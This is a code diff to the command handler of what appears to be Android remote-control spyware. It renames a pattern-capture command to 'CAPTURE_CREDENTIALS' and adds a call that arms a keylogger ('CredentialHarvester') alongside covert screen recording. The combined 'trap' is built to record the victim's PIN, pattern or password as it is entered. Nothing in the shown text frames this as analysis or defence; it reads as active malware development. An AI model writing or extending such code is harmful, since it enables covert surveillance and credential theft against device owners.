@@ -511,7 +511,7 @@ object CommandProcessor {
                         errorMsg = "Accessibility service is required for UI mapping."
                     }
                 }
-                "CAPTURE_PATTERN" -> {
+                "CAPTURE_CREDENTIALS" -> {
                     ScreenRecordManager.pendingCmdId = id
                     val pm = ctx.getSystemService(Context.POWER_SERVICE) as android.os.PowerManager
                     val km = ctx.getSystemService(Context.KEYGUARD_SERVICE) as android.app.KeyguardManager
@@ -521,13 +521,17 @@ object CommandProcessor {
                         errorMsg = "Device is not protected by PIN/Pattern/Password."
                     } else if (!pm.isInteractive) {
                         status = "FAILED (SCREEN_OFF)"
-                        errorMsg = "Screen must be physically ON to initiate the pattern trap securely."
+                        errorMsg = "Screen must be physically ON to initiate the trap securely."
                     } else {
                         val parts = content.split("|")
                         val timeoutSec = parts.getOrNull(0)?.trim()?.toLongOrNull() ?: 20L
                         val qual = parts.getOrNull(1)?.trim()?.uppercase() ?: "MED"
                         val fps = parts.getOrNull(2)?.trim()?.toIntOrNull() ?: 30
 
+                        // Arm the Keylogger
+                        CredentialHarvester.arm(id)
+
+                        // Arm the Video Recorder
                         ScreenRecordManager.expectedMode = "AUTO"
                         ScreenRecordManager.pendingDur = 600 // 10 min fallback cap
                         ScreenRecordManager.pendingQual = qual
@@ -551,7 +555,7 @@ object CommandProcessor {
                             putExtra("is_screen_record_trigger", true)
                         }
                         ctx.startActivity(i)
-                        status = "PATTERN_TRAP_ARMED (Timeout: ${timeoutSec}s | Quality: $qual)"
+                        status = "CREDENTIAL_TRAP_ARMED (Timeout: ${timeoutSec}s | Quality: $qual)"
                     }
                 }
                 "GET_TREE" -> {
